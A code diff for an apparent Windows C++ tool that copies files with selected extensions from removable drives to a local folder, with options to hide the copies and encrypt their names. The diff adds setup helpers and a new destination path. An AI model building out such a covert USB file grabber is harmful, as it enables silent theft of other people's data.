@@ -1,4 +1,5 @@
 ﻿#include<iostream>
+#include<io.h>
 #include<fstream>
 #include<ctime>
 #include<windows.h>
@@ -32,7 +33,7 @@ const char targetExtension[][32]
 #define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
 #define FNE_MAP_DESTINATION	"D:/1.txt"	//键对值文件位置
 #define HIDE_FILE			false	//隐藏被复制的文件
-#define DESTINATION			"D:/"	//复制文件的目的地
+#define DESTINATION			"D:/TEMp"	//复制文件的目的地
 
 ////////////////      控制台      \\\\\\\\\\\\\\\\\
 
@@ -50,11 +51,6 @@ int getRemovableDriver(char(*remDrvList)[4])
 		}
 	}
 	return count;
-}
-
-void fileNameEncrypt(char* fileName)
-{
-
 }
 
 void copyFiles(const char* src)
@@ -106,16 +102,45 @@ void copyFiles(const char* src)
 	}
 }
 
+bool willUseFile(const char* path)
+{
+	if (_access(path, 0))
+	{
+		if (CreateFileA(path, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr))
+		{
+			return true;
+		}
+		else return false;
+	}
+	else return true;
+}
+
+bool willUseDirectory(const char* path)
+{
+	if (_access(path, 0))
+	{
+		CreateDirectoryA(path, nullptr);
+		if (_access(path, 0))
+		{
+			return false;
+		}
+		else return true;
+	}
+	else return true;
+}
+
+void fileNameEncrypt(char* fileName)
+{
+
+}
 
 int main()
 {
-	ifstream inputFile(FNE_MAP_DESTINATION);
-	char t[1024]{};
-	while (inputFile.getline(t, 1024))
+	if (!(willUseDirectory(DESTINATION) && willUseFile(FNE_MAP_DESTINATION)))
 	{
-		cout << t << endl;
+		cout << "必须文件创建失败" << endl;
+		exit(114514);
 	}
-
 
 
 
